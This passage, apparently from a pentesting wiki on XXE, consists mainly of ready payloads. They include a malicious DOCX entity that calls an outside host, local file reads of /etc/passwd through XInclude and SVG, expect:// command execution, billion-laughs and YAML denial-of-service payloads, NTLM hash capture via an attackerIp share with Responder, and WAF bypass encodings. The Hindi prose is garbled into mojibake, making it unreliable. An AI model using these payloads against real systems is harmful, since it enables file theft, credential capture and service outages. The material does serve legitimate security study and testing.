inflating: ./unzipped/word/settings.xml
inflating: ./unzipped/word/fontTable.xml
inflating: ./unzipped/word/styles.xml
inflating: ./unzipped/word/document.xml
inflating: ./unzipped/word/_rels/document.xml.rels
inflating: ./unzipped/_rels/.rels
inflating: ./unzipped/word/theme/theme1.xml
inflating: ./unzipped/[Content_Types].xml
```
```markdown
рдЕрдкрдиреЗ рдкрд╕рдВрджреАрджрд╛ рдЯреЗрдХреНрд╕реНрдЯ рдПрдбрд┐рдЯрд░ (vim) рдореЗрдВ `./unzipped/word/document.xml` рдлрд╛рдЗрд▓ рдХреЛ рдЦреЛрд▓реЗрдВ рдФрд░ **XML рдореЗрдВ рдЕрдкрдирд╛ рдкрд╕рдВрджреАрджрд╛ XXE payload** рд╢рд╛рдорд┐рд▓ рдХрд░реЗрдВред рдкрд╣рд▓реА рдЪреАрдЬрд╝ рдЬреЛ рдореИрдВ рдЖрдЬрдорд╛рддрд╛ рд╣реВрдБ рд╡рд╣ рдПрдХ HTTP рдЕрдиреБрд░реЛрдз рд╣реЛрддреА рд╣реИ, рдЗрд╕ рддрд░рд╣:
```
```
<!DOCTYPE x [ <!ENTITY test SYSTEM "http://[ID].burpcollaborator.net/"> ]>
<x>&test;</x>
```
рдЙрди рдкрдВрдХреНрддрд┐рдпреЛрдВ рдХреЛ рджреЛ рдореВрд▓ XML рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЗ рдмреАрдЪ рдореЗрдВ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдбрд╛рд▓рд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП, рдФрд░ рдирд┐рд╢реНрдЪрд┐рдд рд░реВрдк рд╕реЗ рдЖрдкрдХреЛ URL рдХреЛ рдПрдХ рдРрд╕реЗ URL рд╕реЗ рдмрджрд▓рдирд╛ рд╣реЛрдЧрд╛ рдЬрд┐рд╕ рдкрд░ рдЖрдк рдЕрдиреБрд░реЛрдзреЛрдВ рдХреА рдирд┐рдЧрд░рд╛рдиреА рдХрд░ рд╕рдХреЗрдВ:

![рдЙрди рдкрдВрдХреНрддрд┐рдпреЛрдВ рдХреЛ рджреЛ рдореВрд▓ XML рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЗ рдмреАрдЪ рдореЗрдВ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдбрд╛рд▓рд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП](https://labs.detectify.com/wp-content/uploads/2021/09/xxe-obscure.png)

рдЕрдм рдмрдЪрд╛ рдХреЗрд╡рд▓ рдлрд╛рдЗрд▓ рдХреЛ **zip рдХрд░рдХреЗ рдЖрдкрдХреА evil poc.docx рдлрд╛рдЗрд▓ рдмрдирд╛рдирд╛**ред рдкрд╣рд▓реЗ рдмрдирд╛рдП рдЧрдП "unzipped" рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рд╕реЗ, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЪрд▓рд╛рдПрдВ:

![рдкрд╣рд▓реЗ рдмрдирд╛рдП рдЧрдП "unzipped" рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рд╕реЗ, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЪрд▓рд╛рдПрдВ:](https://labs.detectify.com/wp-content/uploads/2021/09/xxe-unzipped.png)

рдЕрдм рдлрд╛рдЗрд▓ рдХреЛ рдЕрдкрдиреЗ (рдЖрд╢рд╛ рд╣реИ) рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдкрд░ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ рдФрд░ рд╣реИрдХрд┐рдВрдЧ рджреЗрд╡рддрд╛рдУрдВ рд╕реЗ рдЖрдкрдХреЗ Burp Collaborator рд▓реЙрдЧреНрд╕ рдореЗрдВ рдПрдХ рдЕрдиреБрд░реЛрдз рдХреА рдкреНрд░рд╛рд░реНрдердирд╛ рдХрд░реЗрдВред

### Jar: protocol

`jar` рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЗрд╡рд▓ **Java рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕** рдкрд░ рдЙрдкрд▓рдмреНрдз рд╣реИред рдпрд╣ **PKZIP** рдлрд╛рдЗрд▓ (`.zip`, `.jar`, ...) рдХреЗ рдЕрдВрджрд░ рдХреА рдлрд╛рдЗрд▓реЛрдВ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдФрд░ рд╕реНрдерд╛рдиреАрдп рдФрд░ рджреВрд░рд╕реНрде рдлрд╛рдЗрд▓реЛрдВ рдХреЗ рд▓рд┐рдП рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ:
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
{% hint style="danger" %}
PKZIP рдлрд╛рдЗрд▓реЛрдВ рдХреЗ рдЕрдВрджрд░ рдХреА рдлрд╛рдЗрд▓реЛрдВ рддрдХ рдкрд╣реБрдБрдЪрдирд╛ **system DTD рдлрд╛рдЗрд▓реЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ XXE рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрддреНрдпрдВрдд рдЙрдкрдпреЛрдЧреА рд╣реИред** [рдЗрд╕ рдЕрдиреБрднрд╛рдЧ рдХреЛ рджреЗрдЦреЗрдВ system DTD рдлрд╛рдЗрд▓реЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХреИрд╕реЗ рдХрд░реЗрдВ](xxe-xee-xml-external-entity.md#error-based-system-dtd)ред
{% endhint %}

#### рдкрд░реНрджреЗ рдХреЗ рдкреАрдЫреЗ

1. рдпрд╣ zip рдЖрд░реНрдХрд╛рдЗрд╡ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП HTTP рдЕрдиреБрд░реЛрдз рдХрд░рддрд╛ рд╣реИред `https://download.host.com/myarchive.zip`
2. рдпрд╣ HTTP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рдПрдХ рдЕрд╕реНрдерд╛рдпреА рд╕реНрдерд╛рди рдкрд░ рд╕рд╣реЗрдЬрддрд╛ рд╣реИред `/tmp/...`
3. рдпрд╣ рдЖрд░реНрдХрд╛рдЗрд╡ рдХреЛ рдирд┐рдХрд╛рд▓рддрд╛ рд╣реИред
4. рдпрд╣ `file.zip` рдХреЛ рдкрдврд╝рддрд╛ рд╣реИред
5. рдпрд╣ рдЕрд╕реНрдерд╛рдпреА рдлрд╛рдЗрд▓реЛрдВ рдХреЛ рд╣рдЯрд╛ рджреЗрддрд╛ рд╣реИред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рджреВрд╕рд░реЗ рдЪрд░рдг рдореЗрдВ рдкреНрд░рд╡рд╛рд╣ рдХреЛ рд░реЛрдХрдирд╛ рд╕рдВрднрд╡ рд╣реИред рдЪрд╛рд▓ рдпрд╣ рд╣реИ рдХрд┐ рдлрд╛рдЗрд▓ рдХреА рд╕реЗрд╡рд╛ рдХрд░рддреЗ рд╕рдордп рдХрдиреЗрдХреНрд╢рди рдХреЛ рдХрднреА рди рдмрдВрдж рдХрд░реЗрдВред [рдпреЗ рдЙрдкрдХрд░рдг рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ](https://github.com/GoSecure/xxe-workshop/tree/master/24\_write\_xxe/solution): рдПрдХ python рдореЗрдВ `slow_http_server.py` рдФрд░ рдПрдХ java рдореЗрдВ `slowserver.jar`ред

рдПрдХ рдмрд╛рд░ рдЬрдм рд╕рд░реНрд╡рд░ рдЖрдкрдХреА рдлрд╛рдЗрд▓ рдХреЛ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░ рд▓реЗрддрд╛ рд╣реИ, рддреЛ рдЖрдкрдХреЛ temp рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдХреЛ рдмреНрд░рд╛рдЙрдЬрд╝ рдХрд░рдХреЗ рдЙрд╕рдХрд╛ рд╕реНрдерд╛рди рдвреВрдБрдврдирд╛ рд╣реЛрдЧрд╛ред рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рд╣реЛрдиреЗ рдХреЗ рдХрд╛рд░рдг, рдлрд╛рдЗрд▓ рдкрде рдХреЛ рдкрд╣рд▓реЗ рд╕реЗ рдЕрдиреБрдорд╛рди рдирд╣реАрдВ рд▓рдЧрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

![Jar](https://gosecure.github.io/xxe-workshop/img/74fac3155d455980.png)

{% hint style="danger" %}
рдПрдХ рдЕрд╕реНрдерд╛рдпреА рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рдлрд╛рдЗрд▓реЗрдВ рд▓рд┐рдЦрдирд╛ **рдХрд┐рд╕реА рдЕрдиреНрдп рднреЗрджреНрдпрддрд╛ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдореЗрдВ рдорджрдж рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдкрде рдкрд╛рд░рдЧрдорди рд╢рд╛рдорд┐рд▓ рд╣реЛрддрд╛ рд╣реИ** (рдЬреИрд╕реЗ рдХрд┐ рд╕реНрдерд╛рдиреАрдп рдлрд╛рдЗрд▓ рд╢рд╛рдорд┐рд▓ рдХрд░рдирд╛, рдЯреЗрдореНрдкреНрд▓реЗрдЯ рдЗрдВрдЬреЗрдХреНрд╢рди, XSLT RCE, рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди, рдЖрджрд┐)ред
{% endhint %}

### XSS
```markup
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### DoS

#### Billion Laugh Attack
```markup
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Yaml рд╣рдорд▓рд╛
```markup
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### рдХреНрд╡рд╛рдбреНрд░реЗрдЯрд┐рдХ рдмреНрд▓реЛрдЕрдк рдЕрдЯреИрдХ

![](<../.gitbook/assets/image (531).png>)

#### NTML рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛

рд╡рд┐рдВрдбреЛрдЬ рд╣реЛрд╕реНрдЯреНрд╕ рдкрд░ рд╡реЗрдм рд╕рд░реНрд╡рд░ рдпреВрдЬрд░ рдХрд╛ NTML рд╣реИрд╢ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдПрдХ responder.py рд╣реИрдВрдбрд▓рд░ рд╕реЗрдЯ рдХрд░рдХреЗ:
```
Responder.py -I eth0 -v
```
рдФрд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЕрдиреБрд░реЛрдз рднреЗрдЬрдХрд░
```
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
рддрдм рдЖрдк hashcat рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣реИрд╢ рдХреЛ рдХреНрд░реИрдХ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ

## рдЫрд┐рдкреЗ рд╣реБрдП XXE рд╕рддрд╣

### XInclude

[рдпрд╣рд╛рдБ рд╕реЗред](https://portswigger.net/web-security/xxe)

рдХреБрдЫ рдПрдкреНрд▓рд┐рдХреЗрд╢рди **рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рдмрдорд┐рдЯреЗрдб рдбреЗрдЯрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВ, рдЗрд╕реЗ рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдкрд░ рдПрдХ XML рдбреЙрдХреНрдпреВрдореЗрдВрдЯ рдореЗрдВ рдПрдореНрдмреЗрдб рдХрд░рддреЗ рд╣реИрдВ, рдФрд░ рдлрд┐рд░ рдбреЙрдХреНрдпреВрдореЗрдВрдЯ рдХреЛ рдкрд╛рд░реНрд╕ рдХрд░рддреЗ рд╣реИрдВ**ред рдЗрд╕рдХрд╛ рдПрдХ рдЙрджрд╛рд╣рд░рдг рддрдм рд╣реЛрддрд╛ рд╣реИ рдЬрдм рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рдмрдорд┐рдЯреЗрдб рдбреЗрдЯрд╛ рдХреЛ рдПрдХ **рдмреИрдХрдПрдВрдб SOAP рдЕрдиреБрд░реЛрдз** рдореЗрдВ рд░рдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ рдлрд┐рд░ рдмреИрдХрдПрдВрдб SOAP рд╕реЗрд╡рд╛ рджреНрд╡рд╛рд░рд╛ рд╕рдВрд╕рд╛рдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЗрд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ, рдЖрдк рдХреНрд▓рд╛рд╕рд┐рдХ XXE рд╣рдорд▓рд╛ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ, рдХреНрдпреЛрдВрдХрд┐ **рдЖрдк рдкреВрд░реЗ XML рдбреЙрдХреНрдпреВрдореЗрдВрдЯ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдирд╣реАрдВ рдХрд░рддреЗ** рдФрд░ рдЗрд╕рд▓рд┐рдП `DOCTYPE` рддрддреНрд╡ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдпрд╛ рд╕рдВрд╢реЛрдзрд┐рдд рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдк `XInclude` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред `XInclude` XML рд╡рд┐рдирд┐рд░реНрджреЗрд╢ рдХрд╛ рдПрдХ рд╣рд┐рд╕реНрд╕рд╛ рд╣реИ рдЬреЛ рдПрдХ XML рдбреЙрдХреНрдпреВрдореЗрдВрдЯ рдХреЛ рдЙрдк-рдбреЙрдХреНрдпреВрдореЗрдВрдЯреНрд╕ рд╕реЗ рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдЖрдк рдХрд┐рд╕реА рднреА рдбреЗрдЯрд╛ рдореВрд▓реНрдп рдореЗрдВ `XInclude` рд╣рдорд▓рд╛ рд░рдЦ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рд╣рдорд▓рд╛ рдЙрди рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдореЗрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрд╣рд╛рдВ рдЖрдк рдХреЗрд╡рд▓ рдПрдХ рдПрдХрд▓ рдбреЗрдЯрд╛ рдЖрдЗрдЯрдо рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддреЗ рд╣реИрдВ рдЬрд┐рд╕реЗ рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб XML рдбреЙрдХреНрдпреВрдореЗрдВрдЯ рдореЗрдВ рд░рдЦрд╛ рдЬрд╛рддрд╛ рд╣реИред

`XInclude` рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЛ `XInclude` рдиреЗрдорд╕реНрдкреЗрд╕ рдХрд╛ рд╕рдВрджрд░реНрдн рджреЗрдирд╛ рд╣реЛрдЧрд╛ рдФрд░ рдЙрд╕ рдлрд╛рдЗрд▓ рдХрд╛ рдкрде рдкреНрд░рджрд╛рди рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдЬрд┐рд╕реЗ рдЖрдк рд╢рд╛рдорд┐рд▓ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:
```markup
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
### SVG - рдлрд╛рдЗрд▓ рдЕрдкрд▓реЛрдб

[рдпрд╣рд╛рдБ рд╕реЗред](https://portswigger.net/web-security/xxe)

рдХреБрдЫ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдлрд╛рдЗрд▓реЗрдВ рдЕрдкрд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдлрд┐рд░ рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдкрд░ рдкреНрд░реЛрд╕реЗрд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдХреБрдЫ рд╕рд╛рдорд╛рдиреНрдп рдлрд╛рдЗрд▓ рдкреНрд░рд╛рд░реВрдк XML рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рдпрд╛ XML рдЙрдкрдШрдЯрдХреЛрдВ рдХреЛ рд╕рдорд╛рд╣рд┐рдд рдХрд░рддреЗ рд╣реИрдВред XML-рдЖрдзрд╛рд░рд┐рдд рдкреНрд░рд╛рд░реВрдкреЛрдВ рдХреЗ рдЙрджрд╛рд╣рд░рдг рд╣реИрдВ рдСрдлрд┐рд╕ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдкреНрд░рд╛рд░реВрдк рдЬреИрд╕реЗ рдХрд┐ DOCX рдФрд░ рдЫрд╡рд┐ рдкреНрд░рд╛рд░реВрдк рдЬреИрд╕реЗ рдХрд┐ SVGред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ **рдЫрд╡рд┐рдпрд╛рдБ рдЕрдкрд▓реЛрдб рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддрд╛ рд╣реИ, рдФрд░ рдЙрдиреНрд╣реЗрдВ рдЕрдкрд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж рд╕рд░реНрд╡рд░ рдкрд░ рдкреНрд░реЛрд╕реЗрд╕ рдпрд╛ рд╡реИрд▓рд┐рдбреЗрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рднрд▓реЗ рд╣реА рдПрдкреНрд▓рд┐рдХреЗрд╢рди PNG рдпрд╛ JPEG рдЬреИрд╕реЗ рдкреНрд░рд╛рд░реВрдк рдХреА рдЕрдкреЗрдХреНрд╖рд╛ рдХрд░рддрд╛ рд╣реЛ, **рдЫрд╡рд┐ рдкреНрд░реЛрд╕реЗрд╕рд┐рдВрдЧ рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдЬреЛ рдЙрдкрдпреЛрдЧ рдореЗрдВ рд▓реА рдЬрд╛ рд░рд╣реА рд╣реИ рд╡рд╣ SVG рдЫрд╡рд┐рдпреЛрдВ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░ рд╕рдХрддреА рд╣реИ**ред рдЪреВрдВрдХрд┐ SVG рдкреНрд░рд╛рд░реВрдк XML рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг SVG рдЫрд╡рд┐ рд╕рдмрдорд┐рдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЗрд╕ рдкреНрд░рдХрд╛рд░ XXE рднреЗрджреНрдпрддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдЫрд┐рдкреЗ рд╣реБрдП рд╣рдорд▓реЗ рдХреА рд╕рддрд╣ рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддрд╛ рд╣реИред
```markup
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
рдЖрдк PHP "expect" wrapper рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдХрдорд╛рдВрдбреНрд╕ рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```markup
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
**рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдкрдврд╝реА рдЧрдИ рдлрд╝рд╛рдЗрд▓ рдХреА рдкрд╣рд▓реА рдкрдВрдХреНрддрд┐ рдпрд╛ рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рдкрд░рд┐рдгрд╛рдо рдХреА рдкрд╣рд▓реА рдкрдВрдХреНрддрд┐ рдмрдирд╛рдИ рдЧрдИ рдЫрд╡рд┐ рдХреЗ рдЕрдВрджрд░ рджрд┐рдЦрд╛рдИ рджреЗрдЧреАред рдЗрд╕рд▓рд┐рдП рдЖрдкрдХреЛ рдЙрд╕ рдЫрд╡рд┐ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдЬреЛ SVG рдиреЗ рдмрдирд╛рдИ рд╣реИред**

### **PDF - рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб**

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреЛрд╕реНрдЯ рдХреЛ рдкрдврд╝реЗрдВ рддрд╛рдХрд┐ рдЖрдк **XXE рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдирд╛ рд╕реАрдЦ рд╕рдХреЗрдВ рдЬрдм рдЖрдк рдПрдХ PDF** рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░рддреЗ рд╣реИрдВ:

{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
[pdf-upload-xxe-and-cors-bypass.md](file-upload/pdf-upload-xxe-and-cors-bypass.md)
{% endcontent-ref %}

### Content-Type: x-www-urlencoded рд╕реЗ XML рддрдХ

рдпрджрд┐ рдХреЛрдИ POST рдЕрдиреБрд░реЛрдз рдбреЗрдЯрд╛ рдХреЛ XML рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдЖрдк рдЙрд╕ рдЕрдиреБрд░реЛрдз рдореЗрдВ XXE рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рдЕрдиреБрд░реЛрдз рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╣реЛрддрд╛ рд╣реИ:
```markup
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
рддрдм рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЕрдиреБрд░реЛрдз рд╕рдмрдорд┐рдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рд╕рдорд╛рди рдкрд░рд┐рдгрд╛рдо рдХреЗ рд╕рд╛рде:
```markup
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: JSON рд╕реЗ XEE рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрди

рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрди рдХреЗ рд▓рд┐рдП рдЖрдк тАЬ**Content Type Converter**тАЬ рдирд╛рдордХ Burp Extension рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред [рдпрд╣рд╛рдБ](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) рдЖрдк рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдХреЛ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ:
```markup
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```markup
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
рдПрдХ рдФрд░ рдЙрджрд╛рд╣рд░рдг [рдпрд╣рд╛рдБ](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2) рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

## WAF & рд╕реБрд░рдХреНрд╖рд╛ рдмрд╛рдпрдкрд╛рд╕

### Base64
```markup
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
рдпрд╣ рдХреЗрд╡рд▓ рддрднреА рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ рдЬрдм XML рд╕рд░реНрд╡рд░ `data://` рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рддрд╛ рд╣реИред

### UTF-7

рдЖрдк рдпрд╣рд╛рдБ рд╕рд╛рдЗрдмрд░рд╢реЗрдл рдХреА \[**"Encode Recipe**" рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ ]\(\[[https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28%27UTF-7%20%2865000%29%27%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to)) UTF-7 рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред
```markup
